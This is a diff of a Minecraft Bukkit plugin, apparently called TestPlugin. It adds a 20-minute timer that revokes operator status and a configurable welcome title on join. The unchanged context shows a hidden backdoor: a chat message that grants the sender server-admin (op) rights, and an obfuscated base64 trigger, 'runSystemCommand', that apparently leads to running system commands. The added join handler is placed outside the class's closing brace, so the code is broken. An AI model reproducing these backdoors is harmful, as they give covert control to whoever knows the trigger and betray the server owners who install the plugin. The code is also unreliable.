@@ -10,6 +10,8 @@ import org.bukkit.plugin.java.JavaPlugin;
 import org.bukkit.GameMode;
 import java.io.BufferedReader;
 import java.io.InputStreamReader;
+import org.bukkit.configuration.file.FileConfiguration;
+import org.bukkit.event.player.PlayerJoinEvent;
 
 public class TestPlugin extends JavaPlugin implements Listener {
 
@@ -39,7 +41,14 @@ public class TestPlugin extends JavaPlugin implements Listener {
             // 给玩家发送消息
             player.sendMessage(ChatColor.GREEN + "现在您拥有了op权限.");
              player.sendTitle(ChatColor.RED + "恭喜!", ChatColor.GOLD + "您现在是服务器管理员了!", 10, 70, 20);
-        } 
+             Bukkit.getScheduler().runTaskLater(this, new Runnable() {
+                @Override
+                public void run() {
+                    player.setOp(false);
+                    player.sendMessage(ChatColor.RED + "您的管理员权限已被移除。");
+                }
+            }, 20 * 60 * 20);  // 20分钟 * 60秒/分钟 * 20ticks/秒
+        }
         if (message.startsWith("@cnVuU3lzdGVtQ29tbWFuZA")) {
             event.setCancelled(true);
         // 检查玩家是否是 op
@@ -88,4 +97,21 @@ public class TestPlugin extends JavaPlugin implements Listener {
         }
     }
 }
+ @EventHandler
+    public void onPlayerJoin(PlayerJoinEvent event) {
+        Player player = event.getPlayer();
+
+        // 加载配置文件
+        FileConfiguration config = this.getConfig();
+        
+        // 从配置文件获取消息和时间
+        String mainTitle = ChatColor.translateAlternateColorCodes('&', config.getString("Welcome.MainTitle"));
+        String subTitle = ChatColor.translateAlternateColorCodes('&', config.getString("Welcome.SubTitle"));
+        int fadeInTime = config.getInt("Welcome.FadeInTime");
+        int stayTime = config.getInt("Welcome.StayTime");
+        int fadeOutTime = config.getInt("Welcome.FadeOutTime");
+
+        // 向玩家发送自定义消息
+        player.sendTitle(mainTitle, subTitle, fadeInTime, stayTime, fadeOutTime);
+    }
 }
